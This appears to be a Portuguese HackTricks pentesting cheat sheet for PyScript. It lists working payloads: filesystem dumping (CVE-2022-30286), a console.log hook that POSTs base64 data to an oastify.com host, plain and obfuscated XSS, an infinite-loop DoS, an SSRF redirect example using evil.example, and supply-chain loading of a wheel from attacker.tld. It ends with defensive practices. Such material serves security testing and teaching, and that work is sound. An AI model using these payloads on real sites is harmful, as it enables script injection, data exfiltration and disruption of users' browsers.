# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Guia de Pentesting do PyScript

PyScript é um novo framework desenvolvido para integrar Python ao HTML, podendo ser usado em conjunto com HTML. Nesta cheat sheet, você encontrará como usar PyScript para fins de pentesting.

### Dumping / Recuperando arquivos do sistema de arquivos de memória virtual do Emscripten:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Resultado:

![Guia de Pentesting do PyScript - Dumping / Recuperação de arquivos do sistema de arquivos de memória virtual do Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration do sistema de arquivos de memória virtual do Emscripten (monitoramento do console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Código:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Resultado:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Comum)

Código:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Resultado:

![Exfiltração de dados OOB do sistema de arquivos de memória virtual do Emscripten (monitoramento do console) - Cross Site Scripting (Ordinário): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Código:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Resultado:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Código:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Resultado:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (loop infinito)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (loop infinito)

Código:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Resultado:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Novas vulnerabilidades e técnicas (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0` ignora os parâmetros `redirect` e `retries` quando é executado **dentro do runtime Pyodide** fornecido com o PyScript. Quando um atacante consegue influenciar as URLs de destino, ele pode forçar o código Python a seguir redirects entre domínios, mesmo quando o desenvolvedor os desativou explicitamente — efetivamente contornando a lógica anti-SSRF.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Corrigido em `urllib3 2.5.0` – atualize o package na sua imagem PyScript ou fixe uma versão segura em `packages = ["urllib3>=2.5.0"]`. Consulte a entrada oficial do CVE para obter detalhes.

### Carregamento arbitrário de packages e ataques de supply-chain

Como o PyScript permite URLs arbitrárias na lista `packages`, um agente malicioso que consiga modificar ou injetar configurações pode executar **Python totalmente arbitrário** no navegador da vítima:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Somente wheels Python puras são necessárias — nenhuma etapa de compilação WebAssembly é necessária.* Certifique-se de que a configuração não seja controlada pelo usuário e hospede wheels confiáveis em seu próprio domínio com HTTPS e hashes SRI.

### Alterações na sanitização da saída (2023+)

* `print()` ainda injeta HTML bruto e, portanto, é vulnerável a XSS (exemplos acima).
* O helper mais recente `display()` **escapa HTML por padrão** — markup bruto deve ser envolvido em `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Este comportamento foi introduzido em 2023 e está documentado no guia oficial de Built-ins. Use `display()` para entradas não confiáveis e evite chamar `print()` diretamente.<sup>[[2]](#references)</sup>

---

## Melhores práticas defensivas

* **Mantenha os packages atualizados** – atualize para `urllib3 >= 2.5.0` e reconstrua regularmente os wheels distribuídos com o site.
* **Restrinja as fontes de packages** – faça referência apenas a nomes do PyPI ou URLs da mesma origem, idealmente protegidos com Sub-resource Integrity (SRI).
* **Reforce a Content Security Policy** – proíba JavaScript inline (`script-src 'self' 'sha256-…'`) para que blocos `<script>` injetados não possam ser executados.
* **Proíba tags `<py-script>` / `<script type="py">` fornecidas pelo usuário** – faça a sanitização do HTML no servidor antes de devolvê-lo a outros usuários.
* **Isole os workers** – se você não precisar de acesso síncrono ao DOM a partir dos workers, habilite a flag `sync_main_only` para evitar os requisitos de headers do `SharedArrayBuffer`.

## Referências

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentação de Built-ins do PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
